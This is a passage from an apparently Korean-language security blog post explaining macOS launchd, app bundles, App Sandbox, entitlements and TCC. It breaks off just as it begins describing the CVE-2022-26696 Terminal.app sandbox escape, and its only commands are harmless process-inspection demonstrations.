&#xACBD;&#xC6B0; &#xC2E4;&#xC81C; &#xC571;&#xC740; <code>launchd</code>(PID 1)&#xC758; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xC2E4;&#xD589;&#xB3FC;&#xC694;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBAA8;&#xB4E0; &#xC571;&#xC758; &#xBD80;&#xBAA8; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xB2E8;&#xC810;&#xB3C4; &#xC788;&#xB294;&#xB370;&#xC694;, &#xBCF4;&#xD1B5; &#xB2E4;&#xB978; OS&#xC5D0;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC5B4;&#xB5A4; &#xD130;&#xBBF8;&#xB110;, &#xC178;, &#xB370;&#xBAAC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD588;&#xB294;&#xC9C0; <strong>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD2B8;&#xB9AC;(PPID)</strong>&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xBA70; &#xCD94;&#xC801;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xD558;&#xC9C0;&#xB9CC; macOS&#xC5D0;&#xC11C;&#xB294; &#xC571;&#xC744; GUI&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xACBD;&#xC6B0;, <strong>&#xBAA8;&#xB4E0; &#xC571;&#xC774; launchd&#xC758; &#xC790;&#xC2DD;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;</strong>, &#xD2B8;&#xB9AC;&#xAC00; &#xD3C9;&#xD3C9;&#xD558;&#xAC8C; &#xBCF4;&#xC5EC;&#xC11C; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xAD6C;&#xC870;&#xB97C; &#xC54C; &#xC218; &#xC5C6;&#xC5B4;&#xC694;. </p><p>macOS Ventura &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; open &#xBA85;&#xB839;&#xC5B4; &#xC5C6;&#xC774; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370;, &#xC81C;&#xB300;&#xB85C; &#xB41C; launchd &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;  App Sandbox&#xC640; TCC&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC704;&#xD574; macOS&#xAC00; &#xAC15;&#xC81C;&#xB85C; &#xC885;&#xB8CC;(SIGKILL)&#xD558;&#xB3C4;&#xB85D; &#xC81C;&#xD55C;&#xB418;&#xC5C8;&#xC5B4;&#xC694;. </p><pre><code class="hljs bash">$ /System/Applications/Calculator.app/Contents/MacOS/Calculator &amp; $ ps -A -j | grep Calculator | grep -v grep</code></pre><p>&#xC6D0;&#xB798;&#xB294; &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xCC98;&#xB7FC; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB418;&#xBA74;, &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; <code>launchd</code>&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xD604;&#xC7AC; &#xD130;&#xBBF8;&#xB110; &#xC138;&#xC158;&#xC758; PID&#xB97C; &#xBD80;&#xC5EC; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xD130;&#xBBF8;&#xB110;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xADF8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xD130;&#xBBF8;&#xB110;&#xC758; &#xC790;&#xC2DD;&#xC774; &#xB418;&#xC5C8;&#xB358;&#xAC70;&#xC8E0;.</p><p>&#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xC5C8;&#xB358; Calculator&#xB294; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xC544;&#xC11C;, &#xD14C;&#xC2A4;&#xD2B8;&#xC6A9; .app&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; PID&#xC640; PPID&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">mkdir -p ~/MyApp.app/Contents/MacOS<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&apos;#!/bin/bash\nsleep 10&apos;</span> &gt; ~/MyApp.app/Contents/MacOS/MyAppchmod +x ~/MyApp.app/Contents/MacOS/MyApp~/MyApp.app/Contents/MacOS/MyApp &amp;ps -A -j | grep MyAppopen -a MyAppps -A -j | grep MyApp</code></pre><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image3.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image4.png" alt="image.png"></p><p>&#xC774;&#xB807;&#xAC8C; &#xD130;&#xBBF8;&#xB110;&#xC758; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p><code>launchd</code>&#xB294; &#xC774; &#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, <code>LaunchAgents</code>&#xB098; <code>LaunchDaemons</code>&#xB97C; &#xD1B5;&#xD574; macOS&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xC624;&#xB298;&#xC740; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xC744;&#xAC8C;&#xC694;! &#xD22C;&#xBE44;&#xCEE8;&#xD2F0;&#xB274;&#x2026;..</p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC124;&#xBA85;&#xD55C; <code>.app</code>&#xC740; &#xC5EC;&#xB7EC; &#xC885;&#xB958;&#xC758; &#xBC88;&#xB4E4; &#xC911; &#xD558;&#xB098;&#xC77C; &#xBFD0;&#xC778;&#xB370;&#xC694;.</p><p>macOS&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB2E4;&#xC591;&#xD55C; &#xBC88;&#xB4E4; &#xD0C0;&#xC785;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. (&#xC644;&#xC804;&#xD55C; &#xBAA9;&#xB85D;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;&#x314E;&#x314E;;;)</p><ul><li><code>.app</code> &#x2013;  &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xBC88;&#xB4E4;&#xB85C;, &#xD558;&#xB098;&#xC758; &#xC571;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC694;&#xC18C;&#xB97C; &#xD3EC;&#xD568;</li><li><code>.framework</code> &#x2013; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xBC88;&#xB4E4;&#xB85C;, <code>.dylib</code>&#xCC98;&#xB7FC; &#xB85C;&#xB4DC; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB9AC;&#xC18C;&#xC2A4;, &#xBC84;&#xC804; &#xC815;&#xBCF4; &#xB4F1;&#xC744; &#xD3EC;&#xD568; ( <code>dlopen()</code>&#xC73C;&#xB85C; &#xC804;&#xCCB4; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xBC88;&#xB4E4;&#xC744; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC74C;)</li><li><code>.kext</code> &#x2013;  &#xCEE4;&#xB110; &#xC775;&#xC2A4;&#xD150;&#xC158; &#xBC88;&#xB4E4;&#xB85C;, macOS &#xCEE4;&#xB110;&#xC5D0; &#xC9C1;&#xC811; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xD655;&#xC7A5; &#xBAA8;&#xB4C8;<br>&#xBCF4;&#xC548;&#xC0C1;&#xC758; &#xC774;&#xC720;&#xB85C; Apple&#xC740; macOS &#xCD5C;&#xC2E0; &#xBC84;&#xC804;&#xB4E4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC744; &#xC810;&#xCC28; &#xC81C;&#xD55C;&#xD558;&#xACE0; &#xC788;&#xC74C;</li><li><code>.plugin</code> &#x2013; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xBC88;&#xB4E4;&#xB85C;, &#xBA54;&#xC778; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xD655;&#xC7A5; &#xBAA8;&#xB4C8;&#xC744; &#xD3EC;&#xD568;</li></ul><p>&#xC774;&#xCC98;&#xB7FC; &#xBC88;&#xB4E4;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xC571;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC83; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C;, macOS &#xC804;&#xBC18;&#xC5D0;&#xC11C; &#xAE30;&#xB2A5; &#xD655;&#xC7A5;&#xACFC; &#xBAA8;&#xB4C8;&#xD654;&#xB41C; &#xAD6C;&#xC870;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD575;&#xC2EC; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD574;&#xAC00; &#xC798; &#xB418;&#xC168;&#xB098;&#xC694;? </p><p>&#xADF8;&#xB807;&#xB2F4; &#xB2E4;&#xC74C;&#xC73C;&#xB85C; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;~</p><h2 id="1-App-Sandbox"><a href="#1-App-Sandbox" class="headerlink" title="1. App Sandbox"></a>1. App Sandbox</h2><p>&#xC55E;&#xC5D0;&#xC11C; macOS &#xC571;&#xC774; <code>.app</code> &#xBC88;&#xB4E4;&#xC774;&#xB77C;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D4; &#xADF8; &#xC571;&#xC774; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC2E4;&#xD589;&#xB418;&#xACE0;, &#xB610; &#xC5BC;&#xB9C8;&#xB098; &#xC81C;&#xC57D;&#xC744; &#xBC1B;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCFC;&#xD150;&#xB370;&#xC694;. </p><p>&#xC624;&#xB298;&#xC758; &#xD575;&#xC2EC; &#xB0B4;&#xC6A9;&#xC778; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;(Sandbox)</strong>&#xB77C;&#xB294; &#xAC1C;&#xB150;&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xBCF4;&#xC548; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74;, &#xC774;&#xC0C1;&#xC801;&#xC778; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xBBFF;&#xC744; &#xC218; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC544;&#xC608; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xCEF4;&#xD4E8;&#xD130;&#xACA0;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB2E4;&#xBCF4;&#xBA74; &#xB2E4;&#xC591;&#xD55C; &#xC571;&#xC744; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xB2C8; &#xC774;&#xAC74; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xC598;&#xAE30;&#xC608;&#xC694;&#x2026; &#xADF8;&#xB798;&#xC11C; macOS&#xB294; &#xC544;&#xC608; &#x2018;<strong>&#xC571;&#xC744; &#xC81C;&#xD55C;&#xB41C; &#xC6B8;&#xD0C0;&#xB9AC; &#xC548;&#xC5D0;&#xC11C;&#xB9CC; &#xB3CC;&#xC544;&#xAC00;&#xAC8C; &#xD558;&#xC790;!</strong>&#x2019;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBCF4;&#xC548;&#xC744; &#xC124;&#xACC4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC6B8;&#xD0C0;&#xB9AC;&#xAC00; &#xBC14;&#xB85C; <strong>App Sandbox&#xC778;&#xB370;&#xC694;</strong>. &#xC774;&#xB984; &#xADF8;&#xB300;&#xB85C;, &#xC571;&#xC744; &#x2018;&#xC0C1;&#xC790;&#x2019; &#xC548;&#xC5D0; &#xAC00;&#xB46C;&#xB193;&#xACE0; <strong>&#xBC16;&#xC73C;&#xB85C; &#xBABB; &#xB098;&#xAC00;&#xAC8C; &#xB9C9;&#xC544;&#xBC84;&#xB9AC;&#xB294; &#xAD6C;&#xC870;</strong>&#xC778; &#xAC70;&#xC8E0;.</p><p>&#xC571;&#xC774; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC548;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xBA74;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD56D;&#xBAA9;&#xB4E4;&#xC774; &#xC81C;&#xD55C;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xD560; &#xC218; &#xC5C6;&#xC5B4;&#xC694;.</p><div class="table-container"><table><thead><tr><th>&#xC81C;&#xD55C; &#xD56D;&#xBAA9;</th><th>&#xC124;&#xBA85;</th></tr></thead><tbody><tr><td>&#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;</td><td>&#xC0AC;&#xC6A9;&#xC790; &#xD648; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xCC28;&#xB2E8;</td></tr><tr><td>&#xB124;&#xD2B8;&#xC6CC;&#xD06C;</td><td>&#xC778;&#xD130;&#xB137; &#xC811;&#xC18D; &#xBC0F; &#xC18C;&#xCF13; &#xD1B5;&#xC2E0; &#xCC28;&#xB2E8;</td></tr><tr><td>&#xB9C8;&#xC774;&#xD06C;&#xB7;&#xCE74;&#xBA54;&#xB77C;</td><td>&#xC9C1;&#xC811; &#xC811;&#xADFC; &#xBD88;&#xAC00;&#xB2A5; (TCC &#xC2B9;&#xC778; &#xD544;&#xC694;)</td></tr><tr><td>&#xC0AC;&#xC9C4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;</td><td>&#xC811;&#xADFC; &#xBD88;&#xAC00;&#xB2A5; (&#xBCC4;&#xB3C4; &#xAD8C;&#xD55C; &#xD544;&#xC694;)</td></tr><tr><td>&#xC2DC;&#xC2A4;&#xD15C; API</td><td>&#xC2DC;&#xC2A4;&#xD15C; &#xD638;&#xCD9C; &#xBC0F; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC81C;&#xC5B4; &#xB4F1; &#xCC28;&#xB2E8;</td></tr><tr><td>&#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;</td><td>&#xC0DD;&#xC131; &#xAC00;&#xB2A5;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xC0C1;&#xC18D;&#xB428;</td></tr></tbody></table></div><p>&#xADF8;&#xB7EC;&#xB098;.. &#xC571;&#xC758; &#xD544;&#xC218; &#xAE30;&#xB2A5;&#xC774; &#xC81C;&#xD55C;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D;.. &#xD2B9;&#xC815;&#xD55C; &#xAD8C;&#xD55C;&#xB9CC; &#xC608;&#xC678;&#xC801;&#xC73C;&#xB85C; &#xD5C8;&#xC6A9;&#xD574;&#xC8FC;&#xB3C4;&#xB85D; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBBF8;&#xC9C0; &#xD3B8;&#xC9D1; &#xC571;&#xC744; &#xC608;&#xB85C; &#xB4E4;&#xC5B4;&#xBCFC;&#xAC8C;&#xC694;. &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xD3F4;&#xB354;&#xC5D0;&#xC11C; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC5F4;&#xACE0; &#xC800;&#xC7A5;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC571;&#xC774; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC548;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB824;&#xBA74; &#xD2B9;&#xC815; &#xAD8C;&#xD55C;&#xC774; <strong>&#xC608;&#xC678;&#xC801;&#xC73C;&#xB85C; &#xD5C8;&#xC6A9;</strong>&#xB418;&#xC5B4;&#xC57C; &#xD574;&#xC694;. &#xC774;&#xAC78; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBC14;&#xB85C; <code>Entitlements</code>&#xC785;&#xB2C8;&#xB2E4;. </p><p><em>* <code>Entitlements</code> : &#xC571;&#xC774; &#xCF54;&#xB4DC; &#xC11C;&#xBA85;&#xB420; &#xB54C; &#xD568;&#xAED8; &#xC815;&#xC758;&#xB418;&#xB294; &#xAD8C;&#xD55C; &#xC120;&#xC5B8; &#xC815;&#xBCF4;&#xB97C; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;.</em></p><h3 id="1-1-Entitlements&#xB780;"><a href="#1-1-Entitlements&#xB780;" class="headerlink" title="1.1 Entitlements&#xB780;?"></a>1.1 Entitlements&#xB780;?</h3><p>&#xC571;&#xC774; &#xCF54;&#xB4DC; &#xC11C;&#xBA85;&#xB420; &#xB54C; &#xD568;&#xAED8; &#xC815;&#xC758;&#xB418;&#xB294; <strong>&#xAD8C;&#xD55C; &#xC120;&#xC5B8; &#xC815;&#xBCF4;</strong>&#xB97C; &#xB73B;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C;, &#xD544;&#xC694;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xD558;&#xB098;&#xC529; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xB418;&#xB294;&#xB370;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>Entitlement &#xD0A4;</th><th>&#xC124;&#xBA85;</th></tr></thead><tbody><tr><td><code>com.apple.security.network.client</code></td><td>&#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;</td></tr><tr><td><code>com.apple.security.files.user-selected.read-write</code></td><td>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC120;&#xD0DD;&#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xAC00;&#xB2A5;</td></tr><tr><td><code>com.apple.security.assets.pictures.read-write</code></td><td>&#xC0AC;&#xC9C4; &#xD3F4;&#xB354; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</td></tr><tr><td><code>com.apple.security.device.camera</code></td><td>&#xCE74;&#xBA54;&#xB77C; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</td></tr></tbody></table></div><p>&#xC989;, &#xC571;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xBABB; &#xD558;&#xC9C0;&#xB9CC;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD5C8;&#xC6A9;&#xD55C; &#xAD8C;&#xD55C;&#xC5D0; &#xD55C;&#xD574;&#xC11C;&#xB9CC; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC70;&#xC608;&#xC694;.</p><p><code>Entitlements</code>&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; XML &#xD615;&#xC2DD;&#xC758; <code>.entitlements</code> &#xD30C;&#xC77C;&#xB85C; &#xC791;&#xC131;&#xB418;&#xBA70;, Xcode&#xC5D0;&#xC11C;&#xB294; Target &gt; Signing &amp; Capabilities &#xD0ED;&#xC5D0;&#xC11C; &#xC2DC;&#xAC01;&#xC801;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>++  &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB550; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xAF2D; &#xC120;&#xC5B8;&#xD574;&#xC57C; &#xD574;&#xC694;. </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.app-sandbox<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span></code></pre><p>&#xC774; &#xD0A4;&#xAC00; &#xC120;&#xC5B8;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC57C; macOS&#xB294; &#xD574;&#xB2F9; &#xC571;&#xC744; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBAA8;&#xB4DC;&#xB85C; &#xC2E4;&#xD589;</strong>&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="1-2-TCC"><a href="#1-2-TCC" class="headerlink" title="1.2 TCC"></a>1.2 TCC</h3><p>macOS&#xB97C; &#xC4F0;&#xB2E4; &#xBCF4;&#xBA74; &#xC774;&#xB7F0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF8; &#xC801; &#xC788;&#xC73C;&#xC2E4; &#xAC70;&#xC608;&#xC694;.</p><blockquote><p>&#x201C;@@@ &#xC571;&#xC774; &#x2018;Documents&#x2019; &#xD3F4;&#xB354;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD5C8;&#xC6A9;&#xD558;&#xC2DC;&#xACA0;&#xC2B5;&#xB2C8;&#xAE4C;?&#x201D;</p></blockquote><p>&#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xB2E8;&#xC21C;&#xD55C; &#xC54C;&#xB9BC;&#xC774; &#xC544;&#xB2C8;&#xB77C;, macOS&#xC758; &#xBCF4;&#xC548; &#xC2DC;&#xC2A4;&#xD15C; &#xC911; &#xD558;&#xB098;&#xC778; <strong>TCC</strong>(Transparency, Consent, and Control)&#xC5D0; &#xC758;&#xD574; &#xB098;&#xD0C0;&#xB098;&#xB294; &#xACBD;&#xACE0;&#xC785;&#xB2C8;&#xB2E4;. &#xC571;&#xC774; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD560; &#xB54C;, macOS&#xB294; &#xBB34;&#xC870;&#xAC74; &#xBA3C;&#xC800; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; <strong>&#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xB3D9;&#xC758;</strong>&#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; macOS&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xB3D9;&#xC758; &#xC5C6;&#xC774;&#xB294; &#xC571;&#xC774; &#xC911;&#xC694;&#xD55C; &#xC790;&#xC6D0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xB9C9;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><h2 id="2-Sandbox-Escape"><a href="#2-Sandbox-Escape" class="headerlink" title="2. Sandbox Escape"></a>2. Sandbox Escape</h2><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; macOS&#xC758; App Sandbox&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xB2E8;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xB294;&#xB370;&#xC694;!</p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774;&#xAC78; <strong>&#xC6B0;&#xD68C;&#xD574;&#xC11C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xBE60;&#xC838;&#xB098;&#xC624;&#xB294; &#xAC8C; &#xAC00;&#xB2A5;&#xD560;&#xAE4C;&#xC694;?</strong></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xC27D;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;.</p><p>macOS&#xB294; &#xC571;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xCCA0;&#xC800;&#xD788; &#xC81C;&#xD55C;&#xD558;&#xACE0;, &#xC2DC;&#xC2A4;&#xD15C; &#xC790;&#xC6D0;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC;&#xB3C4; &#xC774;&#xC911;&#xC73C;&#xB85C; &#xD1B5;&#xC81C;&#xD558;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD5C8;&#xC220;&#xD55C; &#xAD6C;&#xC870;&#xB9CC; &#xB178;&#xB824;&#xC11C;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBC14;&#xAE65;&#xC73C;&#xB85C; &#xBE60;&#xC838;&#xB098;&#xC624;&#xAE30; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB7FC;&#xC5D0;&#xB3C4; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. macOS&#xC5D0;&#xC11C; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB358; &#xC0AC;&#xB840;&#xB4E4;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xC5EC; &#xB354; &#xC790;&#xC138;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;!</strong> </p><h3 id="2-1-CVE-2022-26696-Terminal-app&#xC744;-&#xD1B5;&#xD55C;-Sandbox-Escape"><a href="#2-1-CVE-2022-26696-Terminal-app&#xC744;-&#xD1B5;&#xD55C;-Sandbox-Escape" class="headerlink" title="2.1 CVE-2022-26696: Terminal.app&#xC744; &#xD1B5;&#xD55C; Sandbox Escape"></a>2.1 CVE-2022-26696: Terminal.app&#xC744; &#xD1B5;&#xD55C; Sandbox Escape</h3><p>CVE-2022-26696&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC774; <code>Terminal.app</code>&#xC744; &#xC2E4;&#xD589;&#xD560; &#xB54C; <strong>&#xD2B9;&#xC815; &#xD658;&#xACBD; &#xBCC0;&#xC218;</strong>&#xB97C; 